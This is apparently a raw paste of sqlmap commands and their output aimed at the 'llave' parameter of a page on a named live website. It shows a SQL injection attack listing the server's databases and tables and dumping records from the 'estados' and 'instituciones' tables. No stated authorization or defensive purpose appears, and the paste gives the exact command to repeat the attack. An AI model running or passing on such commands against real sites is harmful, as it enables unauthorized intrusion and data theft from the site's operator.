
https://cacei.org.mx/nv/nv02/nv0214.php?llave=1547

sqlmap -u https://cacei.org.mx/nv/nv02/nv0214.php?llave=1547


```
sqlmap -u https://cacei.org.mx/nv/nv02/nv0214.php?llave=1547 --dbs -D cacei_web --tables

18:40:39] [INFO] fetching database names
available databases [5]:
[*] cacei_web
[*] information_schema
[*] mysql
[*] performance_schema
[*] test

[18:40:40] [INFO] fetching tables for database: 'cacei_web'
Database: cacei_web
[10 tables]
+---------------------+
| Formato_911         |
| catinstituciones    |
| estados             |
| instituciones       |
| pacreditados        |
| paises              |
| programas           |
| programaseducativos |
| tabla_claves        |
| tabla_fac           |
+---------------------+

Database: mysql
[24 tables]
+---------------------------+
| event                     |
| host                      |
| plugin                    |
| user                      |
| columns_priv              |
| db                        |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| ndb_binlog_index          |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
+---------------------------+



```

```
Database: cacei_web
Table: estados
[34 entries]
+---------+-----------+---------------------+
| pais_id | estado_id | estado              |
+---------+-----------+---------------------+
| 1       | 1         | Ecuador             |
| 2       | 2         | Guatemala           |
| 3       | 3         | Aguascalientes      |
| 3       | 4         | Baaja California    |
| 3       | 5         | Baja California Sur |
| 3       | 6         | Campeche            |
| 3       | 7         | Chiapas             |
| 3       | 8         | Chihuahua           |
| 3       | 9         | Ciudad de México    |
| 3       | 10        | Coahuila            |
| 3       | 11        | Colima              |
| 3       | 12        | Durango             |
| 3       | 13        | México              |
| 3       | 14        | Guanajuato          |
| 3       | 15        | Guerrero            |
| 3       | 16        | Hidalgo             |
| 3       | 17        | Jalisco             |
| 3       | 18        | Michoacán           |
| 3       | 19        | Morelos             |
| 3       | 20        | Nayarit             |
| 3       | 21        | Nuevo León          |
| 3       | 22        | Oaxaca              |
| 3       | 23        | Puebla              |
| 3       | 24        | Querétaro           |
| 3       | 25        | Quintana Roo        |
| 3       | 26        | San Luis Potosí     |
| 3       | 27        | Sinaloa             |
| 3       | 28        | Sonora              |
| 3       | 29        | Tabasco             |
| 3       | 30        | Tamaulipas          |
| 3       | 31        | Tlaxcala            |
| 3       | 32        | Veracruz            |
| 3       | 33        | Yucatán             |
| 3       | 34        | Zacatecas           |
+---------+-----------+---------------------+

```

```
Database: cacei_web
Table: instituciones
[384 entries]
+----------------+------------------------------------------------------------------------------------+
| id_institucion | nom_institucion                                                                    |
+----------------+------------------------------------------------------------------------------------+
[18:45:55] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 13MSU0279D     | Universidad Politécnica de Francisco I. Madero                                     |
| 13MSU0295V     | Universidad Politécnica Metropolitana de Hidalgo                                   |
| 13MSU0335F     | Universidad Tecnológica Minera de Zimapán                                          |
| 14EIT0001C     | Instituto Tecnológico Superior de Zapopan                                          |
| 14MSU0010Z     | Universidad de Guadalajara                                                         |
| 14MSU0021E     | Universidad Tecnológica de Jalisco                                                 |
| 14MSU0028Y     | Universidad Autónoma de Guadalajara                                                |
| 14MSU0031L     | Instituto Tecnológico Superior de Puerto Vallarta                                  |
| 14MSU0036G     | Instituto Tecnológico Superior de Arandas                                          |
| 14MSU0044P     | Instituto Tecnológico y de Estudios Superiores de Occidente                        |
| 14MSU0047M     | Instituto Tecnológico Superior de Chapala                                          |
| 14MSU0048L     | Instituto Tecnológico Superior de Lagos de Moreno                                  |
| 14MSU0050Z     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 14MSU0062E     | Instituto Tecnológico Superior de Tequila                                          |
| 14MSU0070N     | Universidad Panamericana                                                           |
| 14MSU0086O     | Instituto Tecnológico Superior de El Grullo                                        |
| 14MSU0133I     | Instituto Tecnológico de Ciudad Guzmán                                             |
| 14MSU0172K     | Instituto Tecnológico Superior de Tamazula de Gordiano                             |
| 14MSU0337C     | Universidad del Valle de Atemajac                                                  |
| 14MSU0345L     | Centro de Enseñanza Técnica Industrial - Campus Colomos                            |
| 14PSU0184M     | Universidad del Valle de México - Campus Zapopan                                   |
| 15MSU0012W     | Universidad Autónoma del Estado de México                                          |
| 15MSU0019P     | Universidad Tecnológica Fidel Velázquez                                            |
| 15MSU0020E     | Universidad Autónoma de Chapingo                                                   |
| 15MSU0021D     | Universidad Tecnológica de Tecámac                                                 |
| 15MSU0038D     | Universidad Anáhuac                                                                |
| 15MSU0080T     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 15MSU0100Q     | Universidad del Valle de México                                                    |
| 15MSU0180S     | Tecnológico de Estudios Superiores de Ecatepec                                     |
| 15MSU0413R     | Tecnológico de Estudios Superiores de Chalco                                       |
| 15MSU0414Q     | Tecnológico de Estudios Superiores de Jocotitlán                                   |
| 15MSU0573E     | Instituto Tecnológico de Tlalnepantla                                              |
| 15MSU0727R     | Instituto Tecnológico de Toluca                                                    |
| 15MSU0860Y     | Universidad Tecnológica de Nezahualcóyotl                                          |
| 15MSU0870E     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 15MSU0880L     | Universidad Nacional Autónoma de México                                            |
| 15MSU0904E     | Tecnológico de Estudios Superiores de Coacalco                                     |
| 15MSU0905D     | Tecnológico de Estudios Superiores de Cuautitlán Izcalli                           |
| 15MSU0906C     | Tecnológico de Estudios Superiores Huixquilucan                                    |
| 15MSU0907B     | Tecnológico de Estudios Superiores de Jilotepec                                    |
| 15MSU0908A     | Tecnológico de Estudios Superiores de Tianguistenco                                |
| 15MSU0909Z     | Tecnológico de Estudios Superiores del Oriente del Estado de México                |
| 15MSU0910P     | Universidad Tecnológica del Sur del Estado de México                               |
| 15MSU0911O     | Tecnológico de Estudios Superiores de Villa Guerrero                               |
| 15MSU0912N     | Tecnológico de Estudios Superiores de Valle de Bravo                               |
| 15MSU0913M     | Tecnológico de Estudios Superiores de Ixtapaluca                                   |
| 15MSU0918H     | Tecnológico de Estudios Superiores de Chimalhuacán                                 |
| 15MSU0919G     | Tecnológico de Estudios Superiores de San Felipe del Progreso                      |
| 15MSU0922U     | Universidad Tecnológica del Valle de Toluca                                        |
| 15MSU0933Z     | Universidad Politécnica del Valle de México                                        |
| 15MSU0941I     | Universidad Politécnica del Valle de Toluca                                        |
| 15MSU0955L     | Universidad Politécnica de Texcoco                                                 |
| 15PSU2257A     | Universidad del Valle de México                                                    |
| 16MSU0011W     | Instituto Tecnológico Superior de Ciudad Hidalgo                                   |
| 16MSU0014T     | Universidad Michoacana de San Nicolás de Hidalgo                                   |
| 16MSU0017Q     | Instituto Tecnológico Superior de Uruapan                                          |
| 16MSU0018P     | Instituto Tecnológico Superior P'urhépecha                                         |
| 16MSU0022B     | Instituto Tecnológico de Morelia                                                   |
| 16MSU0032I     | Instituto Tecnológico de Zitácuaro                                                 |
| 16MSU0036E     | Instituto Tecnológico Superior de los Reyes                                        |
| 16MSU0037D     | Instituto Tecnológico Superior de Huetamo                                          |
| 16MSU0042P     | Instituto Tecnológico la Piedad                                                    |
| 16MSU0059P     | Instituto Tecnológico Superior de Pátzcuaro - Michoacán                            |
| 16MSU0065Z     | Universidad de la Ciénega del Estado de Michoacán de Ocampo                        |
| 16MSU0074H     | Instituto Tecnológico de Estudios Superiores de Zamora                             |
| 16MSU0090Z     | Instituto Tecnológico Superior de Apatzingán                                       |
| 16MSU0240P     | Instituto Tecnológico de Lázaro Cárdenas                                           |
| 16MSU0241O     | Instituto Tecnológico Superior de Puruándiro                                       |
| 16MSU0246J     | Instituto Tecnológico Superior de Coalcomán                                        |
| 16MSU0248H     | Instituto Tecnológico y de Estudios Superiores de Monterrey Campus Morelia         |
| 16MSU0542K     | Instituto Tecnológico de Jiquilpan                                                 |
| 17MSU0017P     | Universidad Autónoma del Estado de Morelos                                         |
| 17MSU0024Z     | Universidad Tecnológica Emiliano Zapata del Estado de Morelos                      |
| 17MSU0030J     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 17MSU0037C     | Universidad Politécnica del Estado de Morelos                                      |
| 17MSU0237A     | Instituto Tecnológico de Zacatepec                                                 |
| 17MSU0310T     | Instituto Tecnológico de Cuautla                                                   |
| 18MSU0004K     | Universidad Tecnológica de la Costa                                                |
| 18MSU0017O     | Universidad Tecnológica de Bahía de Banderas                                       |
| 18MSU0254Q     | Instituto Tecnológico de Tepic                                                     |
| 18MSU8888C     | Universidad Tecnológica de Nayarit                                                 |
| 19MSU0011T     | Universidad Autónoma de Nuevo León                                                 |
| 19MSU0024X     | Universidad Tecnológica Gral. Mariano Escobedo                                     |
| 19MSU0029S     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 19MSU0037A     | Universidad de Monterrey                                                           |
| 19MSU0094S     | Universidad del Valle de México - Campus Monterrey                                 |
| 19MSU1082U     | Instituto Tecnológico de Nuevo León                                                |
| 19MSU1106N     | Instituto Tecnológico de Linares                                                   |
| 20MSU0037Q     | Instituto Tecnológico de Oaxaca                                                    |
| 20MSU0060R     | Universidad Tecnológica de la Mixteca                                              |
| 20MSU0523I     | Instituto Tecnológico de Tuxtepec                                                  |
| 21MSU0014E     | Benemérita Universidad Autónoma de Puebla                                          |
| 21MSU0023M     | Universidad Tecnológica de Tecamachalco                                            |
| 21MSU0090K     | Instituto Tecnológico de Tecomatlán                                                |
| 21MSU0615Y     | Instituto Tecnológico de Puebla                                                    |
| 21MSU0649O     | Universidad de las Américas Puebla                                                 |
| 21MSU0650D     | Instituto Tecnológico Superior de la Sierra Norte de Puebla                        |
| 21MSU0660K     | Instituto Tecnológico Superior de Teziutlán                                        |
| 21MSU0907M     | Instituto Tecnológico de Tehuacán                                                  |
| 21MSU0931M     | Universidad Popular Autónoma del Estado de Puebla                                  |
| 21MSU0989M     | Universidad Iberoamericana                                                         |
| 21MSU1001H     | Universidad Tecnológica de Puebla                                                  |
| 21MSU1003F     | Instituto Tecnológico Superior de Zacapoaxtla                                      |
| 21MSU1005D     | Instituto Tecnológico Superior de Tepexi de Rodríguez                              |
| 21MSU1064T     | Instituto Tecnológico Superior de Acatlán de Osorio                                |
| 21MSU1065S     | Universidad Tecnológica de Izúcar de Matamoros                                     |
| 21MSU1085F     | Instituto Tecnológico Superior de Atlixco                                          |
| 21MSU1091Q     | Universidad Tecnológica de Huejotzingo                                             |
| 21MSU1117H     | Instituto Tecnológico Superior de Ciudad Serdán                                    |
| 21MSU1120V     | Instituto Tecnológico Superior de Tepeaca                                          |
| 21MSU1121U     | Instituto Tecnológico Superior de Libres                                           |
| 21MSU1122T     | Instituto Tecnológico Superior de Huauchinango                                     |
| 21MSU1142G     | Instituto Tecnológico Superior de San Martín Texmelucan                            |
| 21MSU1188B     | Universidad Tecnológica de Oriental                                                |
| 21MSU1190Q     | Universidad del Valle de México                                                    |
| 21MSU1195L     | Universidad Anáhuac de Puebla S.C.                                                 |
| 21MSU1198I     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 21MSU1241G     | Universidad Tecnológica de Tehuacán                                                |
| 21MSU1280I     | Universidad Tecnológica Bilingüe Internacional y Sustentable de Puebla             |
| 21MSU9118I     | Universidad Tecnológica de Xicotepec de Juárez                                     |
| 22MSU0003Y     | Universidad Tecnológica de Querétaro                                               |
| 22MSU0007U     | Universidad Tecnológica de San Juan del Río                                        |
| 22MSU0016B     | Universidad Autónoma de Querétaro                                                  |
| 22MSU0024K     | Instituto Tecnológico de Querétaro                                                 |
| 22MSU0038N     | Universidad Politécnica de Querétaro                                               |
| 22MSU0045W     | Universidad Anáhuac Querétaro                                                      |
| 22MSU0045X     | Universidad Anáhuac Querétaro                                                      |
| 22MSU0050I     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 22MSU0070W     | Instituto Tecnológico de San Juan del Río                                          |
| 22MSU0080C     | Universidad del Valle de México - Campus Querétaro                                 |
| 22OSU0003W     | Universidad Aeronáutica en Querétaro                                               |
| 23MSU0007T     | Universidad Tecnológica de Cancún                                                  |
| 23MSU0010G     | Universidad Anáhuac de Cancún                                                      |
| 23MSU0012E     | Universidad del Caribe                                                             |
| 23MSU0105U     | Instituto Tecnológico de Cancún                                                    |
| 23MSU0115A     | Instituto Tecnológico de Chetumal                                                  |
| 23MSU0140Z     | Universidad de Quintana Roo                                                        |
| 24MSU0010F     | Instituto Tecnológico Superior de Rioverde                                         |
| 24MSU0011E     | Universidad Autónoma de San Luis Potosí                                            |
| 24MSU0030T     | Instituto Tecnológico y de Estudios Superiores de Monterrey Campus San Luis Potosí |
| 24MSU0040Z     | Instituto Tecnológico de Ciudad Valles                                             |
| 24MSU0190G     | Instituto Tecnológico Superior de Tamazunchale                                     |
| 24MSU0200X     | Universidad Tecnológica de San Luis Potosí                                         |
| 24MSU0223H     | Instituto Tecnológico de San Luis Potosí                                           |
| 24MSU0230R     | Instituto Tecnológico de Matehuala                                                 |
| 24MSU0330Q     | Instituto Tecnológico Superior de San Luis Potosí                                  |
| 25MSU0013B     | Universidad Autónoma de Sinaloa                                                    |
| 25MSU0021K     | Instituto Tecnológico de Culiacán                                                  |
| 25MSU0034O     | Universidad Autónoma Indígena de México                                            |
| 25MSU0078L     | Universidad Politécnica de Sinaloa                                                 |
| 25MSU0105S     | Universidad Tecnológica de Culiacán                                                |
| 25MSU0106R     | Universidad Tecnológica de Escuinapa                                               |
| 25MSU0389O     | Instituto Tecnológico de los Mochis                                                |
| 25MSU0460I     | Instituto Tecnológico de Mazatlán                                                  |
| 25MSU0470P     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 26MSU0003U     | Instituto Tecnológico de Agua Prieta                                               |
| 26MSU0007Q     | Universidad Tecnológica de Hermosillo                                              |
| 26MSU0009O     | Universidad de la Sierra                                                           |
| 26MSU0010D     | Universidad Tecnológica del Sur de Sonora                                          |
| 26MSU0015Z     | Universidad de Sonora                                                              |
| 26MSU0022I     | Universidad Tecnológica de San Luis Rio Colorado                                   |
| 26MSU0023H     | Instituto Tecnológico de Sonora                                                    |
| 26MSU0080Z     | Instituto Tecnológico Superior de Cananea                                          |
| 26MSU0081Y     | Instituto Tecnológico Superior de Cajeme                                           |
| 26MSU0082X     | Instituto Tecnológico Superior de Puerto Peñasco                                   |
| 26MSU0110C     | Instituto Tecnológico de Huatabampo                                                |
| 26MSU0200V     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 26MSU0404P     | Instituto Tecnológico de Hermosillo                                                |
| 26MSU0412Y     | Instituto Tecnológico de Nogales                                                   |
| 26MSU0430N     | Universidad Estatal de Sonora                                                      |
| 26MSU0453Y     | Universidad del Valle de México                                                    |
| 27MSU0001V     | Instituto Tecnológico Superior de Comalcalco                                       |
| 27MSU0007P     | Instituto Tecnológico Superior de Villa la Venta                                   |
| 27MSU0008O     | Universidad Autónoma de Guadalajara - Campus Tabasco                               |
| 27MSU0011B     | Instituto Tecnológico Superior de la Región Sierra                                 |
| 27MSU0012A     | Instituto Tecnológico Superior de Macuspana                                        |
| 27MSU0014Z     | Instituto Tecnológico Superior de Centla                                           |
| 27MSU0018V     | Universidad Juárez Autónoma de Tabasco                                             |
| 27MSU0022H     | Universidad Tecnológica de Tabasco                                                 |
| 27MSU0023G     | Instituto Tecnológico Superior de los Ríos                                         |
| 27MSU0026D     | Universidad del Valle de México - Campus Villahermosa                              |
| 27MSU0028B     | Universidad Tecnológica del Usumacinta                                             |
| 28MSU0010B     | Universidad Autónoma de Tamaulipas                                                 |
| 28MSU0025D     | Universidad Tecnológica de Tamaulipas Norte                                        |
| 28MSU0028A     | Instituto Tecnológico de Ciudad Madero                                             |
| 28MSU0029Z     | Universidad Tecnológica de Matamoros                                               |
| 28MSU0032N     | Universidad Tecnológica de Altamira                                                |
| 28MSU0033M     | Universidad Tecnológica de Nuevo Laredo                                            |
| 28MSU0036J     | Instituto Tecnológico de Nuevo Laredo                                              |
| 28MSU0044S     | Instituto Tecnológico de Matamoros                                                 |
| 28MSU0050C     | Instituto Tecnológico de Reynosa                                                   |
| 28MSU0597S     | Instituto Tecnológico de Ciudad Victoria                                           |
| 28MSU0645L     | Instituto de Estudios Superiores de Tamaulipas                                     |
| 28MSU0720B     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 29MSU0009L     | Instituto Tecnológico de Apizaco                                                   |
| 29MSU0010A     | Instituto Tecnológico del Altiplano de Tlaxcala                                    |
| 29MSU0011Z     | Universidad Tecnológica de Tlaxcala                                                |
| 29MSU0013Y     | Universidad Autónoma de Tlaxcala                                                   |
| 29MSU0031N     | Instituto Tecnológico Superior de Tlaxco                                           |
| 29MSU0051A     | Universidad Politécnica de Tlaxcala Región Poniente                                |
| 30MSU0008B     | Instituto Tecnológico Superior de Tantoyuca                                        |
| 30MSU0020X     | Instituto Tecnológico de Orizaba                                                   |
| 30MSU0038W     | Instituto Tecnológico de Veracruz                                                  |
| 30MSU0046E     | Heroica Escuela Naval Militar                                                      |
| 30MSU0090S     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 30MSU0160X     | Instituto Tecnológico Superior San Andrés Tuxtla                                   |
| 30MSU0170D     | Instituto Tecnológico Superior de Misantla                                         |
| 30MSU0214K     | Instituto Tecnológico Superior de Poza Rica                                        |
| 30MSU0215J     | Instituto Tecnológico Superior de Xalapa                                           |
| 30MSU0220V     | Instituto Tecnológico Superior de Tierra Blanca                                    |
| 30MSU0221U     | Instituto Tecnológico Superior de Coatzacoalcos                                    |
| 30MSU0240I     | Instituto Tecnológico Superior de Perote                                           |
| 30MSU0241H     | Instituto Tecnológico Superior de Zongolica                                        |
| 30MSU0573X     | Instituto Tecnológico de Minatitlán                                                |
| 30MSU0905W     | Instituto Tecnológico de Úrsulo Galván                                             |
| 30MSU0930V     | Instituto Tecnológico de Cerro Azul                                                |
| 30MSU0940B     | Universidad Veracruzana                                                            |
| 30MSU0975R     | Instituto Tecnológico Superior de Pánuco                                           |
| 30MSU0976Q     | Instituto Tecnológico Superior de Cosamaloapan                                     |
| 30MSU6070T     | Instituto Tecnológico Superior de Naranjos                                         |
| 30MSU9021E     | Instituto Tecnológico Superior de Acayucan                                         |
| 30MSU9023C     | Instituto Tecnológico Superior de Álamo Temapache                                  |
| 30MSU9025A     | Instituto Tecnológico Superior de Huatusco                                         |
| 30MSU9026Z     | Instituto Tecnológico Superior de Alvarado                                         |
| 30MSU9027Z     | Universidad Tecnológica del Centro de Veracruz                                     |
| 31MSU0008A     | Universidad Marista de Mérida                                                      |
| 31MSU0011O     | Universidad Modelo                                                                 |
| 31MSU0014L     | Universidad Tecnológica del Mayab                                                  |
| 31MSU0018H     | Instituto Tecnológico Superior del Sur del Estado de Yucatán                       |
| 31MSU0023T     | Instituto Tecnológico de Mérida                                                    |
| 31MSU0026Q     | Universidad Tecnológica Metropolitana de Mérida                                    |
| 31MSU0032A     | Instituto Tecnológico Superior de Valladolid                                       |
| 31MSU0033Z     | Instituto Tecnológico Superior de Motul                                            |
| 31MSU0034Z     | Universidad Tecnológica Regional del Sur                                           |
| 31MSU0035Y     | Instituto Tecnológico Superior de Progreso                                         |
| 31MSU0070D     | Universidad Anáhuac Mayab                                                          |
| 31MSU0098J     | Universidad Autónoma de Yucatán                                                    |
| 31MSU0390O     | Universidad Tecnológica del Centro                                                 |
| 32MSU0003E     | Universidad Tecnológica del Estado de Zacatecas                                    |
| 32MSU0008Z     | Instituto Tecnológico Superior de Zacatecas Occidente                              |
| 32MSU0010O     | Instituto Tecnológico Superior de Fresnillo                                        |
| 32MSU0017H     | Universidad Autónoma de Zacatecas                                                  |
| 32MSU0018G     | Instituto Tecnológico Superior de Jerez                                            |
| 32MSU0040I     | Instituto Tecnológico Superior de Zacatecas Norte                                  |
| 32MSU0050P     | Instituto Tecnológico Superior de Zacatecas Sur                                    |
| 32MSU0078V     | Instituto Tecnológico y de Estudios Superiores de Monterrey                        |
| 32MSU0082H     | Universidad Politécnica de Zacatecas                                               |
| CACEI1144      | Universidad Rafael Landívar                                                        |
| CACEI1145      | Universidad Técnica Particular de Loja                                             |
| CACEI1147      | Sistema Avanzado de Bachillerato y Educación Superior en el Estado de Guanajuato   |
| CACEI1155      | Universidad Nacional Autónoma de México - Campus Ensenada                          |
| CACEI1160      | Universidad del Valle de México - Campus Veracruz                                  |
| CACEI1162      | Universidad Nacional Autónoma de México - Campus Morelos                           |
| CACEICESES     | Centro de Estudios Superiores del Estado de Sonora                                 |
| CACEIITSTG     | Instituto Tecnológico Superior de Tamazula de Gordiano                             |
| CACEIUDVDB     | Universidad del Valle del Bravo                                                    |
+----------------+------------------------------------------------------------------------------------+

```



150-TSU-25A
160-30-05R
200-TSU-54A
210-30-17R
220-30-07R
